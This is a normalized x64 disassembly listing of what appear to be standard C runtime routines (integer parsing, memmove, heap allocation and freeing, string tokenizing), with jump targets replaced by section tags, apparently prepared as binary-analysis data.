call sub_140039634
test al al
je r-xdata
cmp [ rcx + 0x80 ] 0x0
jne r-xdata
test rsi rsi
jne r-xdata
sub rsi 0x2
mov rcx [ rdi + 0x98 ]
mov r8d ebp
mov rdx rsi
call sub_14004288c
test eax eax
jne r-xdata
cmp ebp 0x1
je r-xdata
mov rcx [ rdi + 0x98 ]
lea rdx [ rsp + 0x40 ]
call sub_140042774
test eax eax
jne r-xdata
mov rdx [ rdi + 0x20 ]
cmp [ rdx ] r12
jne r-xdata
mov rax [ rsp + 0x40 ]
and [ rbx ] 0x0
mov [ rbx + 0x8 ] rax
mov eax [ rdi + 0x8c ]
mov [ rbx + 0x10 ] eax
jmp r-xdata
mov rax [ rdi + 0x70 ]
mov rcx [ rdi + 0x78 ]
mov [ rdx ] rax
mov rax [ rdi + 0x40 ]
mov [ rax ] rcx
mov rax [ rdi + 0x58 ]
sub rcx rcx
sar rcx 0x1
mov [ rax ] ecx
mov rbp [ rsp + 0x50 ]
mov rax rbx
mov rbx [ rsp + 0x48 ]
add rsp 0x20
pop r12
pop rdi
pop rsi
retn
sub_140039bb0
mov r11 rsp
mov [ r11 + 0x10 ] rbx
mov [ r11 + 0x18 ] rbp
mov [ r11 + 0x20 ] rsi
push rdi
sub rsp 0x20
mov rax [ r8 + 0x8 ]
mov rbp r8
mov rbx rdx
movsxd r9 eax
movsxd rsi eax
mov rdi rcx
sub rsi r9
mov [ r11 + 0x8 ] rax
add rsi [ r8 ]
cmp [ rcx + 0x98 ] 0x0
je r-xdata
mov rax [ r--data ]
and [ rbx + 0x8 ] 0x0
and [ rbx + 0x10 ] 0x0
mov [ rbx ] rax
call sub_140039634
test al al
je r-xdata
mov rcx [ rdi + 0x98 ]
lea rdx [ rsp + 0x30 ]
call sub_140042908
test eax eax
jne r-xdata
test rsi rsi
je r-xdata
mov rcx [ rdi + 0x98 ]
lea rdx [ rsp + 0x30 ]
call sub_140042774
test eax eax
jne r-xdata
mov rcx [ rdi + 0x98 ]
lea r8d [ rax + 0x1 ]
mov rdx rsi
call sub_14004288c
test eax eax
jne r-xdata
mov eax [ rbp + 0x10 ]
mov rdx [ rdi + 0x20 ]
mov [ rdi + 0x8c ] eax
lea rax [ rdi + 0x88 ]
cmp [ rdx ] rax
jne r-xdata
mov rax [ rsp + 0x30 ]
and [ rbx ] 0x0
mov [ rbx + 0x8 ] rax
mov eax [ rdi + 0x8c ]
mov [ rbx + 0x10 ] eax
jmp r-xdata
mov rax [ rdi + 0x70 ]
mov rcx [ rdi + 0x78 ]
mov [ rdx ] rax
mov rax [ rdi + 0x40 ]
mov [ rax ] rcx
mov rax [ rdi + 0x58 ]
sub rcx rcx
sar rcx 0x1
mov [ rax ] ecx
mov rbp [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
mov rax rbx
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
sub_140039cc0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
xor esi esi
mov rbx rcx
cmp [ rcx + 0x98 ] rsi
jne r-xdata
call sub_140039634
mov rcx [ rbx + 0x98 ]
neg al
sbb rdi rdi
and rdi rbx
call sub_14003b6d8
test eax eax
cmovne rdi rsi
mov edi esi
jmp r-xdata
mov [ rbx + 0x90 ] sil
mov [ rbx + 0x8a ] sil
lea rcx [ rbx + 0x18 ]
mov [ rbx + 0x28 ] rcx
lea rax [ rbx + 0x10 ]
mov [ rbx + 0x20 ] rax
lea rax [ rbx + 0x30 ]
mov [ rbx + 0x40 ] rax
lea rax [ rbx + 0x38 ]
mov [ rbx + 0x48 ] rax
lea rax [ rbx + 0x50 ]
mov [ rbx + 0x58 ] rax
lea rax [ rbx + 0x54 ]
mov [ rbx + 0x60 ] rax
mov [ rcx ] rsi
mov rcx [ rbx + 0x48 ]
mov [ rcx ] rsi
mov rcx [ rbx + 0x60 ]
mov rax rdi
mov [ rcx ] esi
mov rcx [ rbx + 0x20 ]
mov [ rcx ] rsi
mov rcx [ rbx + 0x40 ]
mov [ rcx ] rsi
mov rcx [ rbx + 0x58 ]
mov [ rcx ] esi
mov [ rbx + 0x98 ] rsi
mov ecx [ rw-data ]
mov [ rbx + 0x80 ] rsi
mov rsi [ rsp + 0x38 ]
mov [ rbx + 0x8c ] ecx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
sub_140039d90
mov [ rsp + 0x8 ] rcx
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x48 ] rbx
mov rbx rcx
lea rax [ r--data ]
mov [ rcx ] rax
cmp [ rcx + 0x98 ] 0x0
je r-xdata
cmp [ rbx + 0x90 ] 0x0
je r-xdata
mov rdx [ rcx + 0x20 ]
lea rax [ rcx + 0x88 ]
cmp [ rdx ] rax
jne r-xdata
lea rax [ r--data ]
mov [ rbx ] rax
mov rdi [ rbx + 0x68 ]
test rdi rdi
je r-xdata
mov rcx rbx
call sub_140039cc0
nop
mov rcx [ rcx + 0x78 ]
mov rax [ rbx + 0x70 ]
mov [ rdx ] rax
mov rax [ rbx + 0x40 ]
mov [ rax ] rcx
sub rcx rcx
sar rcx 0x1
mov rax [ rbx + 0x58 ]
mov [ rax ] ecx
lea rcx [ rbx + 0x8 ]
mov rbx [ rsp + 0x48 ]
add rsp 0x30
pop rdi
jmp sub_1400382dc
mov rcx rdi
call sub_140002af0
mov rcx rdi
call j_sub_14003ad04
sub_140039e38
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov ebx edx
mov rdi rcx
call sub_140039d90
test bl 0x1
je r-xdata
mov rax rdi
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rdi
call j_sub_14003ad04
sub_140039e84
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x20 ] rbp
push rsi
push rdi
push r12
sub rsp 0x50
mov rdi rdx
movsxd rbx ecx
test rdx rdx
jne r-xdata
mov esi [ rdx ]
mov r12d [ rdx + 0x4 ]
call sub_14003f768
mov esi [ rax + 0x8 ]
call sub_14003f730
mov r12d eax
jmp r-xdata
mov ebp 0x2
cmp ebx 0x100
jae r-xdata
lea eax [ rbx - 0x61 ]
cmp eax 0x19
ja r-xdata
test esi esi
jne r-xdata
test rdi rdi
jne r-xdata
test rdi rdi
jne r-xdata
mov eax ebx
jmp r-xdata
sub ebx 0x20
mov eax ebx
sar rax 0x8
movzx ecx al
mov rax [ rdi + 0x8 ]
movsx edx [ rax + rcx * 2 ]
shr edx 0xf
and edx 0x1
call sub_140041898
mov ecx ebx
sar ecx 0x8
movzx ecx cl
movzx edx [ rax + rcx * 2 ]
and edx 0x8000
jmp r-xdata
mov rax [ rdi + 0x8 ]
test [ rax + rbx * 2 ] bpl
je r-xdata
mov ecx ebx
call sub_14003e4d0
test eax eax
jne r-xdata
lea r11 [ rsp + 0x50 ]
mov rbx [ r11 + 0x20 ]
mov rbp [ r11 + 0x38 ]
mov rsp r11
pop r12
pop rdi
pop rsi
retn
mov [ rsp + 0x78 ] bl
mov [ rsp + 0x79 ] 0x0
mov ebp 0x1
mov eax ebx
mov [ rsp + 0x79 ] bl
mov [ rsp + 0x7a ] 0x0
sar eax 0x8
mov [ rsp + 0x78 ] al
jmp r-xdata
test edx edx
je r-xdata
jmp r-xdata
cmp eax 0x1
movzx eax [ rsp + 0x80 ]
je r-xdata
mov [ rsp + 0x40 ] 0x1
mov [ rsp + 0x38 ] r12d
lea rax [ rsp + 0x80 ]
mov [ rsp + 0x30 ] 0x3
mov [ rsp + 0x28 ] rax
lea r9 [ rsp + 0x78 ]
mov r8d 0x200
mov edx esi
xor ecx ecx
mov [ rsp + 0x20 ] ebp
call sub_140041ba0
test eax eax
je r-xdata
movzx ecx [ rsp + 0x81 ]
shl eax 0x8
or eax ecx
sub_140039fc4
mov rax rsp
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rbp
mov [ rax + 0x20 ] rsi
push rdi
push r12
push r13
sub rsp 0x20
lea rsi [ rax + 0x8 ]
test rdx rdx
mov r12 rcx
mov rdi rcx
movzx ecx [ rcx ]
mov rbp r9
cmovne rsi rdx
mov r13d r8d
jmp r-xdata
call sub_14003e654
test eax eax
jne r-xdata
inc rdi
movzx ecx [ rdi ]
mov bl [ rdi ]
cmp bl 0x2d
je r-xdata
inc rdi
cmp bl 0x2b
je r-xdata
mov edi 0x7fffffff
cmp r12 [ rsi ]
jne r-xdata
mov [ rsi ] r12
mov bl 0x2b
jmp r-xdata
cmp bl 0x2b
jne r-xdata
test eax eax
jne r-xdata
mov r9 rbp
mov r8d r13d
mov rdx rsi
mov rcx rdi
call sub_14003a3a0
mov r11d eax
cmp rdi [ rsi ]
jne r-xdata
cmp bl 0x2d
jne r-xdata
cmp eax edi
ja r-xdata
call sub_14003f1a4
mov [ rax ] 0x22
test rbp rbp
je r-xdata
neg eax
cmp bl 0x2d
cmove r11d eax
mov eax r11d
cmp eax 0x80000000
jbe r-xdata
mov eax 0x80000000
cmp bl 0x2d
cmove edi eax
mov eax edi
jmp r-xdata
mov [ rbp ] 0x1
mov rbx [ rsp + 0x48 ]
mov rbp [ rsp + 0x50 ]
mov rsi [ rsp + 0x58 ]
add rsp 0x20
pop r13
pop r12
pop rdi
retn
sub_14003a0b8
mov rax rsp
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rbp
mov [ rax + 0x20 ] rsi
push rdi
push r12
push r13
sub rsp 0x20
lea rsi [ rax + 0x8 ]
test rdx rdx
mov r12 rcx
mov rdi rcx
movzx ecx [ rcx ]
mov rbp r9
cmovne rsi rdx
mov r13d r8d
jmp r-xdata
call sub_14003e654
test eax eax
jne r-xdata
inc rdi
movzx ecx [ rdi ]
mov bl [ rdi ]
cmp bl 0x2d
je r-xdata
inc rdi
cmp bl 0x2b
je r-xdata
mov rdi 0x8000000000000000
cmp r12 [ rsi ]
jne r-xdata
mov [ rsi ] r12
mov bl 0x2b
jmp r-xdata
cmp bl 0x2b
jne r-xdata
test rax rax
jne r-xdata
mov r9 rbp
mov r8d r13d
mov rdx rsi
mov rcx rdi
call sub_14003a1ac
mov r11 rax
cmp rdi [ rsi ]
jne r-xdata
cmp bl 0x2d
jne r-xdata
mov rax 0x7fffffffffffffff
cmp r11 rax
ja r-xdata
call sub_14003f1a4
mov [ rax ] 0x22
test rbp rbp
je r-xdata
mov rax r11
neg rax
cmp bl 0x2d
cmove r11 rax
mov rax r11
cmp r11 rdi
jbe r-xdata
sub bl 0x2d
neg bl
sbb rax rax
add rax rdi
jmp r-xdata
mov [ rbp ] 0x1
mov rbx [ rsp + 0x48 ]
mov rbp [ rsp + 0x50 ]
mov rsi [ rsp + 0x58 ]
add rsp 0x20
pop r13
pop r12
pop rdi
retn
sub_14003a1ac
mov [ rsp + 0x20 ] r9
mov [ rsp + 0x10 ] rdx
push rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x38
mov r14 r9
mov esi r8d
mov rbp rdx
mov r13 rcx
test r9 r9
je r-xdata
mov rbx rcx
movzx ecx [ rcx ]
jmp r-xdata
and [ r9 ] 0x0
call sub_14003e654
test eax eax
jne r-xdata
inc rbx
movzx ecx [ rbx ]
mov r12b [ rbx ]
cmp r12b 0x2d
je r-xdata
inc rbx
cmp r12b 0x2b
je r-xdata
test rbp rbp
je r-xdata
cmp esi 0x1
je r-xdata
mov r12b 0x2b
jmp r-xdata
xor eax eax
mov [ rbp ] r13
cmp esi 0x24
jg r-xdata
test esi esi
js r-xdata
mov cl 0x30
test esi esi
jle r-xdata
cmp [ rbx ] cl
je r-xdata
cmp esi 0x10
jne r-xdata
mov al [ rbx + 0x1 ]
cmp al 0x78
je r-xdata
mov esi 0xa
jmp r-xdata
mov r15 rbx
jmp r-xdata
cmp [ rbx ] cl
jne r-xdata
mov esi 0x10
cmp al 0x58
je r-xdata
cmp [ rbx ] cl
je r-xdata
mov al [ rbx + 0x1 ]
cmp al 0x78
je r-xdata
mov esi 0x8
jmp r-xdata
inc rbx
movsx ecx [ rbx ]
xor edi edi
mov [ rsp + 0x20 ] rbx
and [ rsp + 0x80 ] rdi
mov [ rsp + 0x90 ] dil
movsxd rsi esi
call sub_140042a90
lea rcx [ r--data ]
mov r8 rsi
mov edx eax
call sub_14003b840
test rax rax
je r-xdata
add rbx 0x2
cmp al 0x58
jne r-xdata
cmp r15 rbx
je r-xdata
lea r14 [ r--data ]
jmp r-xdata
lea rax [ r--data ]
mov rcx rbx
movsx rax [ rsi + rax ]
sub rcx rax
sub rcx [ rsp + 0x20 ]
js r-xdata
mov bpl al
mov [ rsp + 0x80 ] rdi
mov rcx rsi
sub bpl r14b
inc rbx
imul rcx rdi
movsx rdi bpl
mov [ rsp + 0x90 ] bpl
add rdi rcx
movsx ecx [ rbx ]
call sub_140042a90
mov r8 rsi
mov rcx r14
mov edx eax
call sub_14003b840
test rax rax
jne r-xdata
mov rbp [ rsp + 0x88 ]
mov r14 [ rsp + 0x98 ]
cmp r12b 0x2d
jne r-xdata
test rcx rcx
jg r-xdata
test rbp rbp
je r-xdata
neg rdi
call sub_14003f1a4
mov [ rax ] 0x22
test r14 r14
je r-xdata
movsx rcx [ rsp + 0x90 ]
mov rax rdi
sub rax rcx
cmp rdi rax
jb r-xdata
mov rax rdi
jmp r-xdata
mov [ rbp ] rbx
or rdi 0xffffffffffffffff
mov r12b 0x2b
mov [ r14 ] 0x1
xor edx edx
div rsi
cmp rax [ rsp + 0x80 ]
je r-xdata
add rsp 0x38
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
pop rbx
retn
sub_14003a3a0
mov [ rsp + 0x20 ] r9
mov [ rsp + 0x10 ] rdx
push rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x38
mov r14 r9
mov esi r8d
mov rbp rdx
mov r13 rcx
test r9 r9
je r-xdata
mov rbx rcx
movzx ecx [ rcx ]
jmp r-xdata
and [ r9 ] 0x0
call sub_14003e654
test eax eax
jne r-xdata
inc rbx
movzx ecx [ rbx ]
mov r12b [ rbx ]
cmp r12b 0x2d
je r-xdata
inc rbx
cmp r12b 0x2b
je r-xdata
test rbp rbp
je r-xdata
cmp esi 0x1
je r-xdata
mov r12b 0x2b
jmp r-xdata
xor eax eax
mov [ rbp ] r13
cmp esi 0x24
jg r-xdata
test esi esi
js r-xdata
mov cl 0x30
test esi esi
jle r-xdata
cmp [ rbx ] cl
je r-xdata
cmp esi 0x10
jne r-xdata
mov al [ rbx + 0x1 ]
cmp al 0x78
je r-xdata
mov esi 0xa
jmp r-xdata
mov [ rsp + 0x80 ] rbx
jmp r-xdata
cmp [ rbx ] cl
jne r-xdata
mov esi 0x10
cmp al 0x58
je r-xdata
cmp [ rbx ] cl
je r-xdata
mov al [ rbx + 0x1 ]
cmp al 0x78
je r-xdata
mov esi 0x8
jmp r-xdata
inc rbx
movsx ecx [ rbx ]
xor edi edi
mov [ rsp + 0x20 ] rbx
and [ rsp + 0x90 ] edi
movsxd r15 esi
call sub_140042a90
lea rcx [ r--data ]
mov r8 r15
mov edx eax
call sub_14003b840
test rax rax
je r-xdata
add rbx 0x2
cmp al 0x58
jne r-xdata
mov r15b [ rsp + 0x90 ]
movsxd rbp esi
lea r14 [ r--data ]
jmp r-xdata
lea rcx [ r--data ]
movsxd rax esi
movsx rax [ rax + rcx ]
mov rcx rbx
sub rcx rax
sub rcx [ rsp + 0x20 ]
js r-xdata
mov [ rsp + 0x90 ] edi
sub al r14b
inc rbx
movsx ecx [ rbx ]
movsx r15d al
imul edi esi
add edi r15d
call sub_140042a90
mov r8 rbp
mov edx eax
mov rcx r14
call sub_14003b840
test rax rax
jne r-xdata
mov rbp [ rsp + 0x88 ]
mov r14 [ rsp + 0x98 ]
jmp r-xdata
cmp r12b 0x2d
jne r-xdata
test rcx rcx
jg r-xdata
cmp [ rsp + 0x80 ] rbx
je r-xdata
test rbp rbp
je r-xdata
neg edi
call sub_14003f1a4
mov [ rax ] 0x22
test r14 r14
je r-xdata
movsx ecx r15b
mov eax edi
sub eax ecx
cmp edi eax
jb r-xdata
mov eax edi
jmp r-xdata
mov [ rbp ] rbx
or edi 0xffffffff
mov r12b 0x2b
mov [ r14 ] 0x1
xor edx edx
div esi
cmp eax [ rsp + 0x90 ]
je r-xdata
add rsp 0x38
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
pop rbx
retn
sub_14003a580
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
sub rsp 0x30
movaps [ rax - 0x18 ] xmm6
mov rbp r9
mov r12d r8d
mov rbx rdx
mov rdi rcx
call sub_14003f1a4
mov esi [ rax ]
call sub_14003f1a4
mov rdx rbx
and [ rax ] 0x0
mov rcx rdi
call sub_140042c1c
movapd xmm6 xmm0
call sub_14003f1a4
mov ecx [ rax ]
mov [ rbp ] ecx
call sub_14003f1a4
movsd xmm0 [ r--data ]
mov [ rax ] esi
jmp r-xdata
test r12d r12d
jg r-xdata
mulsd xmm6 xmm0
dec r12d
jns r-xdata
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
movapd xmm0 xmm6
movaps xmm6 [ rsp + 0x20 ]
mov rdi [ rsp + 0x58 ]
add rsp 0x30
pop r12
retn
neg r12d
mov eax r12d
dec rax
divsd xmm6 xmm0
jne r-xdata
sub_14003a624
sub rsp 0x28
mov rax [ rw-data ]
test rax rax
jne r-xdata
dec rax
mov [ rw-data ] rax
call [ EncodePointer@IAT ]
mov rcx [ rw-data ]
lea rdx [ rw-data ]
mov [ rdx + rcx * 8 ] rax
add rsp 0x28
retn
add rsp 0x28
jmp sub_140042c24
sub_14003a6f0
test rdx rdx
je r-xdata
retn
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rdi rcx
mov rcx rdx
mov rbx rdx
call sub_14003f7f0
mov rsi rax
lea rcx [ rax + 0x1 ]
call sub_14003ae78
mov [ rdi + 0x8 ] rax
test rax rax
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
lea rdx [ rsi + 0x1 ]
mov r8 rbx
mov rcx rax
call sub_140042dcc
mov [ rdi + 0x10 ] 0x1
sub_14003a774
push rbx
sub rsp 0x20
and [ rcx + 0x8 ] 0x0
lea rax [ r--data ]
mov [ rcx + 0x10 ] 0x0
mov [ rcx ] rax
mov rdx [ rdx ]
mov rbx rcx
call sub_14003a6f0
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_14003a7a4
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rdi rdx
mov rbx rcx
cmp rcx rdx
je r-xdata
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
call sub_14003a74c
cmp [ rdi + 0x10 ] 0x0
je r-xdata
mov rax [ rdi + 0x8 ]
mov [ rbx + 0x8 ] rax
mov rdx [ rdi + 0x8 ]
mov rcx rbx
call sub_14003a6f0
jmp r-xdata
sub_14003a850
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rax [ r--data ]
mov ebx edx
mov rdi rcx
mov [ rcx ] rax
call sub_14003a74c
test bl 0x1
je r-xdata
mov rax rdi
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rdi
call j_sub_14003ad04
sub_14003a8c0
mov r11 rcx
sub rdx rcx
jb r-xdata
add rcx r8
cmp r8 0x8
jb r-xdata
cmp r8 0x8
jb r-xdata
test r8 r8
jne r-xdata
test cl 0x7
je r-xdata
test r8 r8
jne r-xdata
test cl 0x7
je r-xdata
dec rcx
mov al [ rdx + rcx ]
dec r8
mov [ rcx ] al
jne r-xdata
mov rax r11
retn
mov r9 r8
shr r9 0x5
jne r-xdata
test cl 0x1
je r-xdata
mov al [ rdx + rcx ]
mov [ rcx ] al
inc rcx
dec r8
jne r-xdata
mov rax r11
retn
mov r9 r8
shr r9 0x5
jne r-xdata
test cl 0x1
je r-xdata
mov rax r11
retn
cmp r9 0x2000
jae r-xdata
mov r9 r8
shr r9 0x3
je r-xdata
test cl 0x2
je r-xdata
dec rcx
mov al [ rdx + rcx ]
dec r8
mov [ rcx ] al
mov rax r11
retn
cmp r9 0x2000
jae r-xdata
mov r9 r8
shr r9 0x3
je r-xdata
test cl 0x2
je r-xdata
mov al [ rdx + rcx ]
dec r8
mov [ rcx ] al
inc rcx
cmp rdx 0xfffffffffffff000
ja r-xdata
mov rax [ rdx + rcx - 0x8 ]
mov r10 [ rdx + rcx - 0x10 ]
sub rcx 0x20
mov [ rcx + 0x18 ] rax
mov [ rcx + 0x10 ] r10
mov rax [ rdx + rcx + 0x8 ]
mov r10 [ rdx + rcx ]
dec r9
mov [ rcx + 0x8 ] rax
mov [ rcx ] r10
jne r-xdata
sub rcx 0x8
mov rax [ rdx + rcx ]
dec r9
mov [ rcx ] rax
jne r-xdata
test cl 0x4
je r-xdata
sub rcx 0x2
mov ax [ rdx + rcx ]
sub r8 0x2
mov [ rcx ] ax
cmp rdx 0x1000
jb r-xdata
mov rax [ rdx + rcx ]
mov r10 [ rdx + rcx + 0x8 ]
add rcx 0x20
mov [ rcx - 0x20 ] rax
mov [ rcx - 0x18 ] r10
mov rax [ rdx + rcx - 0x10 ]
mov r10 [ rdx + rcx - 0x8 ]
dec r9
mov [ rcx - 0x10 ] rax
mov [ rcx - 0x8 ] r10
jne r-xdata
mov rax [ rdx + rcx ]
mov [ rcx ] rax
add rcx 0x8
dec r9
jne r-xdata
test cl 0x4
je r-xdata
mov ax [ rdx + rcx ]
sub r8 0x2
mov [ rcx ] ax
add rcx 0x2
mov eax 0x20
and r8 0x1f
jmp r-xdata
and r8 0x7
sub rcx 0x4
mov eax [ rdx + rcx ]
sub r8 0x4
mov [ rcx ] eax
mov eax 0x20
and r8 0x1f
jmp r-xdata
and r8 0x7
mov eax [ rdx + rcx ]
sub r8 0x4
mov [ rcx ] eax
add rcx 0x4
sub rcx 0x80
prefetchnta [ rdx + rcx ]
prefetchnta [ rdx + rcx + 0x40 ]
dec eax
jne r-xdata
add rcx 0x1000
mov eax 0x40
prefetchnta [ rdx + rcx ]
prefetchnta [ rdx + rcx + 0x40 ]
add rcx 0x80
dec eax
jne r-xdata
sub rcx 0x1000
mov eax 0x40
mov r9 [ rdx + rcx - 0x8 ]
mov r10 [ rdx + rcx - 0x10 ]
movnti [ rcx - 0x8 ] r9
movnti [ rcx - 0x10 ] r10
mov r9 [ rdx + rcx - 0x18 ]
mov r10 [ rdx + rcx - 0x20 ]
movnti [ rcx - 0x18 ] r9
movnti [ rcx - 0x20 ] r10
mov r9 [ rdx + rcx - 0x28 ]
mov r10 [ rdx + rcx - 0x30 ]
sub rcx 0x40
movnti [ rcx + 0x18 ] r9
movnti [ rcx + 0x10 ] r10
mov r9 [ rdx + rcx + 0x8 ]
mov r10 [ rdx + rcx ]
dec eax
movnti [ rcx + 0x8 ] r9
movnti [ rcx ] r10
jne r-xdata
sub r8 0x1000
cmp r8 0x1000
jae r-xdata
mov r9 [ rdx + rcx ]
mov r10 [ rdx + rcx + 0x8 ]
movnti [ rcx ] r9
movnti [ rcx + 0x8 ] r10
mov r9 [ rdx + rcx + 0x10 ]
mov r10 [ rdx + rcx + 0x18 ]
movnti [ rcx + 0x10 ] r9
movnti [ rcx + 0x18 ] r10
mov r9 [ rdx + rcx + 0x20 ]
mov r10 [ rdx + rcx + 0x28 ]
add rcx 0x40
movnti [ rcx - 0x20 ] r9
movnti [ rcx - 0x18 ] r10
mov r9 [ rdx + rcx - 0x10 ]
mov r10 [ rdx + rcx - 0x8 ]
dec eax
movnti [ rcx - 0x10 ] r9
movnti [ rcx - 0x8 ] r10
jne r-xdata
sub r8 0x1000
cmp r8 0x1000
jae r-xdata
[ rsp ] 0x0
jmp r-xdata
[ rsp ] 0x0
jmp r-xdata
sub_14003ac04
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rax [ r--data ]
mov ebx edx
mov rdi rcx
mov [ rcx ] rax
call sub_140042e30
test bl 0x1
je r-xdata
mov rax rdi
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rdi
call j_sub_14003ad04
sub_14003ac60
push rbx
sub rsp 0x40
mov rbx rcx
jmp r-xdata
call sub_14003ae78
test rax rax
je r-xdata
mov rcx rbx
call sub_140042ea4
test eax eax
je r-xdata
add rsp 0x40
pop rbx
retn
mov eax [ rw-data ]
mov r8d 0x1
lea rbx [ r--data ]
test r8b al
jne r-xdata
mov rcx rbx
lea rdx [ rw-data ]
lea rcx [ rsp + 0x20 ]
call sub_14003a824
lea rdx [ r--data ]
lea rcx [ rsp + 0x20 ]
mov [ rsp + 0x20 ] rbx
call sub_14003f22c
int3
or eax r8d
lea rdx [ rsp + 0x58 ]
lea rcx [ rw-data ]
mov [ rw-data ] eax
lea rax [ r--data ]
mov [ rsp + 0x58 ] rax
call sub_14003a6c0
lea rcx [ sub_14005a18c ]
mov [ rw-data ] rbx
call sub_14004005c
sub_14003ad04
test rcx rcx
je r-xdata
retn
push rbx
sub rsp 0x20
mov r8 rcx
mov rcx [ rw-data ]
xor edx edx
call [ HeapFree@IAT ]
test eax eax
jne r-xdata
add rsp 0x20
pop rbx
call sub_14003f1a4
mov rbx rax
call [ GetLastError@IAT ]
mov ecx eax
call sub_14003f15c
mov [ rbx ] eax
sub_14003ad44
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
push rdi
push r12
push r13
sub rsp 0x30
mov [ rsp + 0x20 ] rsp
mov r12d r8d
mov rdi rdx
mov rsi rcx
xor r13d r13d
mov eax r13d
test rcx rcx
setne al
test eax eax
jne r-xdata
mov eax r13d
test rdx rdx
setne al
test eax eax
je r-xdata
call sub_14003f1a4
mov [ rax ] 0x16
call sub_140043760
mov eax r13d
cmp [ rdx ] r13w
setne al
test eax eax
je r-xdata
mov rbx [ rsp + 0x58 ]
mov rsi [ rsp + 0x60 ]
add rsp 0x30
pop r13
pop r12
pop rdi
retn
call sub_140043410
mov rbx rax
mov [ rsp + 0x50 ] rax
test rax rax
jne r-xdata
cmp [ rsi ] r13w
jne r-xdata
call sub_14003f1a4
mov [ rax ] 0x18
jmp r-xdata
mov r9 rax
mov r8d r12d
mov rdx rdi
mov rcx rsi
call sub_140043130
mov rdi rax
mov rcx rbx
call sub_14003bdf4
mov rax rdi
call sub_14003f1a4
mov [ rax ] 0x16
lea rdx [ r-xdata ]
mov rcx [ rsp + 0x20 ]
call sub_140043790
nop
nop
xor eax eax
jmp r-xdata
xor eax eax
jmp r-xdata
sub_14003ae24
push rbx
sub rsp 0x20
mov rax r8
mov r9 rdx
mov rbx rcx
test rcx rcx
jne r-xdata
mov r8d 0x80
mov rdx rax
mov rcx r9
call sub_14003ad44
mov [ rbx ] rax
test rax rax
je r-xdata
call sub_14003f1a4
mov ebx 0x16
mov [ rax ] ebx
call sub_140043760
mov eax ebx
jmp r-xdata
call sub_14003f1a4
mov eax [ rax ]
xor eax eax
jmp r-xdata
add rsp 0x20
pop rbx
retn
sub_14003ae78
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rbx rcx
cmp rcx 0xffffffffffffffe0
ja r-xdata
call sub_140042ea4
call sub_14003f1a4
mov [ rax ] 0xc
xor eax eax
mov edi 0x1
test rcx rcx
cmovne rdi rcx
mov r8 rdi
xor edx edx
call [ HeapAlloc@IAT ]
mov rsi rax
test rax rax
jne r-xdata
call sub_140043a80
mov ecx 0x1e
call sub_140043820
mov ecx 0xff
call sub_14003de68
mov rax rsi
jmp r-xdata
cmp [ rw-data ] eax
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
call sub_14003f1a4
mov [ rax ] 0xc
mov rcx rbx
call sub_140042ea4
test eax eax
je r-xdata
call sub_14003f1a4
mov [ rax ] 0xc
jmp r-xdata
mov rcx [ rw-data ]
test rcx rcx
jne r-xdata
sub_14003af30
mov [ rsp + 0x18 ] rbx
push rdi
sub rsp 0x50
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x40 ] rax
mov rdi rdx
mov rbx rcx
call sub_140043c34
xor r10d r10d
mov r11 rax
mov [ rsp + 0x20 ] r10
mov [ rsp + 0x28 ] r10
mov [ rsp + 0x30 ] r10
mov [ rsp + 0x38 ] r10
movzx r9d [ rdi ]
mov edx 0x1
inc rdi
mov ecx r9d
mov r8d r9d
and ecx 0x7
shr r8 0x3
shl dl cl
or [ rsp + r8 + 0x20 ] dl
test r9b r9b
jne r-xdata
test rbx rbx
jne r-xdata
movzx r8d [ rbx ]
mov edx 0x1
mov ecx r8d
mov eax r8d
and ecx 0x7
shr rax 0x3
shl edx cl
test [ rsp + rax + 0x20 ] dl
jne r-xdata
mov rbx [ rax + 0x20 ]
jmp r-xdata
test r8b r8b
je r-xdata
mov r9 rbx
jmp r-xdata
inc rbx
cmp [ rbx ] r10b
jne r-xdata
movzx r8d [ rbx ]
mov edx 0x1
mov ecx r8d
shr r8 0x3
and ecx 0x7
shl edx cl
test [ rsp + r8 + 0x20 ] dl
jne r-xdata
jmp r-xdata
mov [ rbx ] r10b
inc rbx
inc rbx
cmp r9 rbx
mov [ r11 + 0x20 ] rbx
cmove r9 r10
mov rax r9
mov rcx [ rsp + 0x40 ]
xor rcx rsp
call sub_14003a6a0
mov rbx [ rsp + 0x70 ]
